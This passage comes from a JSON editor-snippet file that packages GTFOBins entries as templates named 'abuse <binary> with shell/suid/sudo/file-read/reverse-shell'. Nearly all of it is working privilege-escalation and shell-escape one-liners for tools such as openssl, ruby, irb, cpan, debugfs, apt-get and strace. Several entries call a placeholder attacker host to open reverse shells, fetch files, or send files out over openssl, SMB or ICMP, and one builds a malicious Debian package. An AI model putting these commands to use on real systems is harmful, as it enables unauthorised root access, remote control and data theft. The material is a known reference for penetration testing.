            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_save}",
            "openssl s_client -quiet -connect \\$RHOST:\\$RPORT > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-download - \nTo send the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\n\n\nFetch a file from a TCP port, transmission will be encrypted.\n"
    },
    "openssl file-write (gtfobins)": {
        "prefix": "openssl file-write",
        "body": [
            "abuse openssl with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "openssl enc -in \"\\$TF\" -out \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-write"
    },
    "openssl file-read (gtfobins)": {
        "prefix": "openssl file-read",
        "body": [
            "abuse openssl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "openssl enc -in \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-read"
    },
    "openssl suid (gtfobins)": {
        "prefix": "openssl suid",
        "body": [
            "abuse openssl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | openssl enc -out \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with suid"
    },
    "openssl sudo (gtfobins)": {
        "prefix": "openssl sudo",
        "body": [
            "abuse openssl with sudo, \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect \\$RHOST:\\$RPORT > /tmp/s; rm /tmp/s${0}",
            "```"
        ],
        "description": "abuse openssl with sudo - \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n"
    },
    "openssl library-load (gtfobins)": {
        "prefix": "openssl library-load",
        "body": [
            "abuse openssl with library-load",
            "",
            "```sh",
            "openssl req -engine ./lib.so${0}",
            "```"
        ],
        "description": "abuse openssl with library-load"
    },
    "unexpand file-read (gtfobins)": {
        "prefix": "unexpand file-read",
        "body": [
            "abuse unexpand with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "unexpand -t99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse unexpand with file-read"
    },
    "unexpand suid (gtfobins)": {
        "prefix": "unexpand suid",
        "body": [
            "abuse unexpand with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./unexpand -t99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse unexpand with suid"
    },
    "unexpand sudo (gtfobins)": {
        "prefix": "unexpand sudo",
        "body": [
            "abuse unexpand with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo unexpand -t99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse unexpand with sudo"
    },
    "scanmem shell (gtfobins)": {
        "prefix": "scanmem shell",
        "body": [
            "abuse scanmem with shell",
            "",
            "```sh",
            "scanmem",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse scanmem with shell"
    },
    "scanmem suid (gtfobins)": {
        "prefix": "scanmem suid",
        "body": [
            "abuse scanmem with suid",
            "",
            "```sh",
            "./scanmem",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse scanmem with suid"
    },
    "scanmem sudo (gtfobins)": {
        "prefix": "scanmem sudo",
        "body": [
            "abuse scanmem with sudo",
            "",
            "```sh",
            "sudo scanmem",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse scanmem with sudo"
    },
    "smbclient shell (gtfobins)": {
        "prefix": "smbclient shell",
        "body": [
            "abuse smbclient with shell",
            "",
            "```sh",
            "smbclient '\\\\attacker\\share'",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse smbclient with shell"
    },
    "smbclient file-upload (gtfobins)": {
        "prefix": "smbclient file-upload",
        "body": [
            "abuse smbclient with file-upload, Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.",
            "",
            "```sh",
            "smbclient '\\\\attacker\\share' -c 'put ${1:file_to_send} where_to_save'${0}",
            "```"
        ],
        "description": "abuse smbclient with file-upload - Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file."
    },
    "smbclient file-download (gtfobins)": {
        "prefix": "smbclient file-download",
        "body": [
            "abuse smbclient with file-download, Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.",
            "",
            "```sh",
            "smbclient '\\\\attacker\\share' -c 'put ${1:file_to_send} where_to_save'${0}",
            "```"
        ],
        "description": "abuse smbclient with file-download - Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file."
    },
    "smbclient sudo (gtfobins)": {
        "prefix": "smbclient sudo",
        "body": [
            "abuse smbclient with sudo",
            "",
            "```sh",
            "sudo smbclient '\\\\attacker\\share'",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse smbclient with sudo"
    },
    "task shell (gtfobins)": {
        "prefix": "task shell",
        "body": [
            "abuse task with shell",
            "",
            "```sh",
            "task execute /bin/sh${0}",
            "```"
        ],
        "description": "abuse task with shell"
    },
    "task sudo (gtfobins)": {
        "prefix": "task sudo",
        "body": [
            "abuse task with sudo",
            "",
            "```sh",
            "sudo task execute /bin/sh${0}",
            "```"
        ],
        "description": "abuse task with sudo"
    },
    "knife shell (gtfobins)": {
        "prefix": "knife shell",
        "body": [
            "abuse knife with shell",
            "",
            "```sh",
            "knife exec -E 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse knife with shell"
    },
    "knife sudo (gtfobins)": {
        "prefix": "knife sudo",
        "body": [
            "abuse knife with sudo",
            "",
            "```sh",
            "sudo knife exec -E 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse knife with sudo"
    },
    "debugfs shell (gtfobins)": {
        "prefix": "debugfs shell",
        "body": [
            "abuse debugfs with shell",
            "",
            "```sh",
            "debugfs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse debugfs with shell"
    },
    "debugfs suid (gtfobins)": {
        "prefix": "debugfs suid",
        "body": [
            "abuse debugfs with suid",
            "",
            "```sh",
            "./debugfs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse debugfs with suid"
    },
    "debugfs sudo (gtfobins)": {
        "prefix": "debugfs sudo",
        "body": [
            "abuse debugfs with sudo",
            "",
            "```sh",
            "sudo debugfs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse debugfs with sudo"
    },
    "service shell (gtfobins)": {
        "prefix": "service shell",
        "body": [
            "abuse service with shell",
            "",
            "```sh",
            "/usr/sbin/service ../../bin/sh${0}",
            "```"
        ],
        "description": "abuse service with shell"
    },
    "service sudo (gtfobins)": {
        "prefix": "service sudo",
        "body": [
            "abuse service with sudo",
            "",
            "```sh",
            "sudo service ../../bin/sh${0}",
            "```"
        ],
        "description": "abuse service with sudo"
    },
    "check_by_ssh shell (gtfobins)": {
        "prefix": "check_by_ssh shell",
        "body": [
            "abuse check_by_ssh with shell, The shell will only last 10 seconds.",
            "",
            "```sh",
            "check_by_ssh -o \"ProxyCommand /bin/sh -i <\\$(tty) |& tee \\$(tty)\" -H localhost -C xx${0}",
            "```"
        ],
        "description": "abuse check_by_ssh with shell - The shell will only last 10 seconds."
    },
    "check_by_ssh sudo (gtfobins)": {
        "prefix": "check_by_ssh sudo",
        "body": [
            "abuse check_by_ssh with sudo, The shell will only last 10 seconds.",
            "",
            "```sh",
            "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <\\$(tty) |& tee \\$(tty)\" -H localhost -C xx${0}",
            "```"
        ],
        "description": "abuse check_by_ssh with sudo - The shell will only last 10 seconds."
    },
    "cdist shell (gtfobins)": {
        "prefix": "cdist shell",
        "body": [
            "abuse cdist with shell",
            "",
            "```sh",
            "cdist shell -s /bin/sh${0}",
            "```"
        ],
        "description": "abuse cdist with shell"
    },
    "cdist sudo (gtfobins)": {
        "prefix": "cdist sudo",
        "body": [
            "abuse cdist with sudo",
            "",
            "```sh",
            "sudo cdist shell -s /bin/sh${0}",
            "```"
        ],
        "description": "abuse cdist with sudo"
    },
    "genie shell (gtfobins)": {
        "prefix": "genie shell",
        "body": [
            "abuse genie with shell",
            "",
            "```sh",
            "genie -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse genie with shell"
    },
    "genie suid (gtfobins)": {
        "prefix": "genie suid",
        "body": [
            "abuse genie with suid",
            "",
            "```sh",
            "./genie -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse genie with suid"
    },
    "genie sudo (gtfobins)": {
        "prefix": "genie sudo",
        "body": [
            "abuse genie with sudo",
            "",
            "```sh",
            "sudo genie -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse genie with sudo"
    },
    "gzip file-read (gtfobins)": {
        "prefix": "gzip file-read",
        "body": [
            "abuse gzip with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "gzip -c \\$LFILE | gzip -d${0}",
            "```"
        ],
        "description": "abuse gzip with file-read"
    },
    "gzip suid (gtfobins)": {
        "prefix": "gzip suid",
        "body": [
            "abuse gzip with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./gzip -f \\$LFILE -t${0}",
            "```"
        ],
        "description": "abuse gzip with suid"
    },
    "gzip sudo (gtfobins)": {
        "prefix": "gzip sudo",
        "body": [
            "abuse gzip with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo gzip -f \\$LFILE -t${0}",
            "```"
        ],
        "description": "abuse gzip with sudo"
    },
    "posh shell (gtfobins)": {
        "prefix": "posh shell",
        "body": [
            "abuse posh with shell",
            "",
            "```sh",
            "posh${0}",
            "```"
        ],
        "description": "abuse posh with shell"
    },
    "posh limited-suid (gtfobins)": {
        "prefix": "posh limited-suid",
        "body": [
            "abuse posh with limited-suid",
            "",
            "```sh",
            "./posh${0}",
            "```"
        ],
        "description": "abuse posh with limited-suid"
    },
    "posh sudo (gtfobins)": {
        "prefix": "posh sudo",
        "body": [
            "abuse posh with sudo",
            "",
            "```sh",
            "sudo posh${0}",
            "```"
        ],
        "description": "abuse posh with sudo"
    },
    "links file-read (gtfobins)": {
        "prefix": "links file-read",
        "body": [
            "abuse links with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "links \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse links with file-read"
    },
    "links suid (gtfobins)": {
        "prefix": "links suid",
        "body": [
            "abuse links with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./links \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse links with suid"
    },
    "links sudo (gtfobins)": {
        "prefix": "links sudo",
        "body": [
            "abuse links with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo links \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse links with sudo"
    },
    "dpkg shell (gtfobins)": {
        "prefix": "dpkg shell",
        "body": [
            "abuse dpkg with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "dpkg -l",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse dpkg with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "dpkg sudo (gtfobins)": {
        "prefix": "dpkg sudo",
        "body": [
            "abuse dpkg with sudo, \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo dpkg -i x_1.0_all.deb${0}",
            "```"
        ],
        "description": "abuse dpkg with sudo - \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "iconv file-write (gtfobins)": {
        "prefix": "iconv file-write",
        "body": [
            "abuse iconv with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with file-write"
    },
    "iconv file-read (gtfobins)": {
        "prefix": "iconv file-read",
        "body": [
            "abuse iconv with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "iconv -f 8859_1 -t 8859_1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with file-read"
    },
    "iconv suid (gtfobins)": {
        "prefix": "iconv suid",
        "body": [
            "abuse iconv with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./iconv -f 8859_1 -t 8859_1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with suid"
    },
    "iconv sudo (gtfobins)": {
        "prefix": "iconv sudo",
        "body": [
            "abuse iconv with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./iconv -f 8859_1 -t 8859_1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with sudo"
    },
    "grep file-read (gtfobins)": {
        "prefix": "grep file-read",
        "body": [
            "abuse grep with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "grep '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse grep with file-read"
    },
    "grep suid (gtfobins)": {
        "prefix": "grep suid",
        "body": [
            "abuse grep with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./grep '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse grep with suid"
    },
    "grep sudo (gtfobins)": {
        "prefix": "grep sudo",
        "body": [
            "abuse grep with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo grep '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse grep with sudo"
    },
    "hping3 shell (gtfobins)": {
        "prefix": "hping3 shell",
        "body": [
            "abuse hping3 with shell",
            "",
            "```sh",
            "hping3",
            "/bin/sh${0}",
            "```"
        ],
        "description": "abuse hping3 with shell"
    },
    "hping3 suid (gtfobins)": {
        "prefix": "hping3 suid",
        "body": [
            "abuse hping3 with suid",
            "",
            "```sh",
            "./hping3",
            "/bin/sh -p${0}",
            "```"
        ],
        "description": "abuse hping3 with suid"
    },
    "hping3 sudo (gtfobins)": {
        "prefix": "hping3 sudo",
        "body": [
            "abuse hping3 with sudo, \nThe file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n\n\n```\n\nsudo hping3 --icmp --listen xxx --dump\n\n```\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "LFILE=${1:file_to_read}",
            "sudo hping3 \"\\$RHOST\" --icmp --data 500 --sign xxx --file \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hping3 with sudo - \nThe file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n\n\n```\n\nsudo hping3 --icmp --listen xxx --dump\n\n```\n"
    },
    "irb shell (gtfobins)": {
        "prefix": "irb shell",
        "body": [
            "abuse irb with shell",
            "",
            "```sh",
            "irb",
            "exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse irb with shell"
    },
    "irb reverse-shell (gtfobins)": {
        "prefix": "irb reverse-shell",
        "body": [
            "abuse irb with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST='127.0.0.1'",
            "export RPORT=9000",
            "irb",
            "require 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end${0}",
            "```"
        ],
        "description": "abuse irb with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "irb file-upload (gtfobins)": {
        "prefix": "irb file-upload",
        "body": [
            "abuse irb with file-upload, Serve files in the local folder running an HTTP server on port 8888.",
            "",
            "```sh",
            "irb",
            "require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;${0}",
            "```"
        ],
        "description": "abuse irb with file-upload - Serve files in the local folder running an HTTP server on port 8888."
    },
    "irb file-download (gtfobins)": {
        "prefix": "irb file-download",
        "body": [
            "abuse irb with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "irb",
            "require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])${0}",
            "```"
        ],
        "description": "abuse irb with file-download - Fetch a remote file via HTTP GET request."
    },
    "irb file-write (gtfobins)": {
        "prefix": "irb file-write",
        "body": [
            "abuse irb with file-write",
            "",
            "```sh",
            "irb",
            "File.open(\"${1:file_to_write}\", \"w+\") { |f| f.write(\"DATA\") }${0}",
            "```"
        ],
        "description": "abuse irb with file-write"
    },
    "irb file-read (gtfobins)": {
        "prefix": "irb file-read",
        "body": [
            "abuse irb with file-read",
            "",
            "```sh",
            "irb",
            "puts File.read(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse irb with file-read"
    },
    "irb library-load (gtfobins)": {
        "prefix": "irb library-load",
        "body": [
            "abuse irb with library-load",
            "",
            "```sh",
            "irb",
            "require \"fiddle\"; Fiddle.dlopen(\"lib.so\")${0}",
            "```"
        ],
        "description": "abuse irb with library-load"
    },
    "irb sudo (gtfobins)": {
        "prefix": "irb sudo",
        "body": [
            "abuse irb with sudo",
            "",
            "```sh",
            "sudo irb",
            "exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse irb with sudo"
    },
    "apt-get shell (gtfobins)": {
        "prefix": "apt-get shell",
        "body": [
            "abuse apt-get with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "apt-get changelog apt",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt-get with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "apt-get sudo (gtfobins)": {
        "prefix": "apt-get sudo",
        "body": [
            "abuse apt-get with sudo, When the shell exits the `update` command is actually executed.",
            "",
            "```sh",
            "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt-get with sudo - When the shell exits the `update` command is actually executed."
    },
    "cpan shell (gtfobins)": {
        "prefix": "cpan shell",
        "body": [
            "abuse cpan with shell, \n`cpan` lets you execute perl commands with the `! command`.\n",
            "",
            "```sh",
            "cpan",
            "! exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse cpan with shell - \n`cpan` lets you execute perl commands with the `! command`.\n"
    },
    "cpan reverse-shell (gtfobins)": {
        "prefix": "cpan reverse-shell",
        "body": [
            "abuse cpan with reverse-shell, Run `nc -lvp RPORT` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=localhost",
            "export RPORT=9000",
            "cpan",
            "! use Socket; my \\$i=\"\\$ENV{RHOST}\"; my \\$p=\\$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};${0}",
            "```"
        ],
        "description": "abuse cpan with reverse-shell - Run `nc -lvp RPORT` on the attacker box to receive the shell."
    },
    "cpan file-upload (gtfobins)": {
        "prefix": "cpan file-upload",
        "body": [
            "abuse cpan with file-upload, Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.",
            "",
            "```sh",
            "cpan",
            "! use HTTP::Server::Simple; my \\$server= HTTP::Server::Simple->new(); \\$server->run();${0}",
            "```"
        ],
        "description": "abuse cpan with file-upload - Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`."
    },
    "cpan file-download (gtfobins)": {
        "prefix": "cpan file-download",
        "body": [
            "abuse cpan with file-download, Fetch a remote file via an HTTP GET request and store it in `PWD`.",
            "",
            "```sh",
            "export URL=http://${1:attacker.com}/file_to_get",
            "cpan",
            "! use File::Fetch; my \\$file = (File::Fetch->new(uri => \"\\$ENV{URL}\"))->fetch();${0}",
            "```"
        ],
        "description": "abuse cpan with file-download - Fetch a remote file via an HTTP GET request and store it in `PWD`."
    },
    "cpan sudo (gtfobins)": {
        "prefix": "cpan sudo",
        "body": [
            "abuse cpan with sudo",
            "",
            "```sh",
            "sudo cpan",
            "! exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse cpan with sudo"
    },
    "distcc shell (gtfobins)": {
        "prefix": "distcc shell",
        "body": [
            "abuse distcc with shell",
            "",
            "```sh",
            "distcc /bin/sh${0}",
            "```"
        ],
        "description": "abuse distcc with shell"
    },
    "distcc suid (gtfobins)": {
        "prefix": "distcc suid",
        "body": [
            "abuse distcc with suid",
            "",
            "```sh",
            "./distcc /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse distcc with suid"
    },
    "distcc sudo (gtfobins)": {
        "prefix": "distcc sudo",
        "body": [
            "abuse distcc with sudo",
            "",
            "```sh",
            "sudo distcc /bin/sh${0}",
            "```"
        ],
        "description": "abuse distcc with sudo"
    },
    "batcat shell (gtfobins)": {
        "prefix": "batcat shell",
        "body": [
            "abuse batcat with shell",
            "",
            "```sh",
            "batcat --paging always /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse batcat with shell"
    },
    "batcat limited-suid (gtfobins)": {
        "prefix": "batcat limited-suid",
        "body": [
            "abuse batcat with limited-suid",
            "",
            "```sh",
            "./batcat --paging always /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse batcat with limited-suid"
    },
    "batcat sudo (gtfobins)": {
        "prefix": "batcat sudo",
        "body": [
            "abuse batcat with sudo",
            "",
            "```sh",
            "sudo batcat --paging always /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse batcat with sudo"
    },
    "strace file-write (gtfobins)": {
        "prefix": "strace file-write",
        "body": [
            "abuse strace with file-write, The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "strace -s 999 -o \\$LFILE strace - DATA${0}",
            "```"
        ],
        "description": "abuse strace with file-write - The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`."
    },
    "strace shell (gtfobins)": {
        "prefix": "strace shell",
        "body": [
            "abuse strace with shell",
            "",
            "```sh",
            "strace -o /dev/null /bin/sh${0}",
            "```"
        ],
        "description": "abuse strace with shell"
    },
    "strace suid (gtfobins)": {
        "prefix": "strace suid",
        "body": [
            "abuse strace with suid",
            "",
            "```sh",
            "./strace -o /dev/null /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse strace with suid"
    },
    "strace sudo (gtfobins)": {
        "prefix": "strace sudo",
        "body": [
            "abuse strace with sudo",
            "",
            "```sh",
            "sudo strace -o /dev/null /bin/sh${0}",
            "```"
        ],
        "description": "abuse strace with sudo"
    },
    "redcarpet file-read (gtfobins)": {
        "prefix": "redcarpet file-read",
        "body": [
            "abuse redcarpet with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "redcarpet \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse redcarpet with file-read"
    },
    "redcarpet sudo (gtfobins)": {
        "prefix": "redcarpet sudo",
        "body": [
            "abuse redcarpet with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo redcarpet \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse redcarpet with sudo"
    },
    "ruby shell (gtfobins)": {
        "prefix": "ruby shell",
        "body": [
            "abuse ruby with shell",
            "",
            "```sh",
            "ruby -e 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ruby with shell"
    },
    "ruby reverse-shell (gtfobins)": {
        "prefix": "ruby reverse-shell",
        "body": [
            "abuse ruby with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'${0}",
            "```"
        ],
        "description": "abuse ruby with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "ruby file-upload (gtfobins)": {
        "prefix": "ruby file-upload",
        "body": [
            "abuse ruby with file-upload, Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.",
            "",
            "```sh",
            "export LPORT=8888",
            "ruby -run -e httpd . -p \\$LPORT${0}",
            "```"
        ],
        "description": "abuse ruby with file-upload - Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later."
    },
    "ruby file-download (gtfobins)": {
        "prefix": "ruby file-download",
        "body": [
            "abuse ruby with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "ruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse ruby with file-download - Fetch a remote file via HTTP GET request."
    },
    "ruby file-write (gtfobins)": {
        "prefix": "ruby file-write",
        "body": [
            "abuse ruby with file-write",
            "",
            "```sh",
            "ruby -e 'File.open(\"${1:file_to_write}\", \"w+\") { |f| f.write(\"DATA\") }'${0}",
            "```"
        ],
        "description": "abuse ruby with file-write"
    },
    "ruby file-read (gtfobins)": {
        "prefix": "ruby file-read",
        "body": [
            "abuse ruby with file-read",
            "",
            "```sh",
            "ruby -e 'puts File.read(\"${1:file_to_read}\")'${0}",
            "```"
        ],
        "description": "abuse ruby with file-read"
    },
    "ruby library-load (gtfobins)": {
        "prefix": "ruby library-load",
        "body": [
            "abuse ruby with library-load",
            "",
            "```sh",
            "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'${0}",
            "```"
        ],
        "description": "abuse ruby with library-load"
    },
    "ruby sudo (gtfobins)": {
        "prefix": "ruby sudo",
        "body": [
            "abuse ruby with sudo",
            "",
            "```sh",
            "sudo ruby -e 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ruby with sudo"
    },
    "ruby capabilities (gtfobins)": {
        "prefix": "ruby capabilities",
        "body": [
            "abuse ruby with capabilities",
            "",
            "```sh",
            "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ruby with capabilities"
    },
    "csh shell (gtfobins)": {
        "prefix": "csh shell",
        "body": [
            "abuse csh with shell",
            "",
            "```sh",
            "csh${0}",
            "```"
        ],
        "description": "abuse csh with shell"
    },
    "csh file-write (gtfobins)": {
        "prefix": "csh file-write",
        "body": [
            "abuse csh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "ash -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse csh with file-write"
    },
    "csh suid (gtfobins)": {
        "prefix": "csh suid",
        "body": [
            "abuse csh with suid",
            "",
            "```sh",
            "./csh -b${0}",
            "```"
        ],
        "description": "abuse csh with suid"
    },
    "csh sudo (gtfobins)": {
        "prefix": "csh sudo",
        "body": [
            "abuse csh with sudo",
            "",
            "```sh",
            "sudo csh${0}",
            "```"
        ],
        "description": "abuse csh with sudo"
    },
    "ul file-read (gtfobins)": {
        "prefix": "ul file-read",
        "body": [
            "abuse ul with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ul \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ul with file-read"
    },
    "ul suid (gtfobins)": {
        "prefix": "ul suid",
        "body": [
            "abuse ul with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ul \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ul with suid"
    },
    "ul sudo (gtfobins)": {
        "prefix": "ul sudo",
        "body": [
            "abuse ul with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ul \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ul with sudo"
    },
    "genisoimage file-read (gtfobins)": {
        "prefix": "genisoimage file-read",
        "body": [
            "abuse genisoimage with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "genisoimage -q -o - \"\\$LFILE\"${0}",
            "```"
        ],
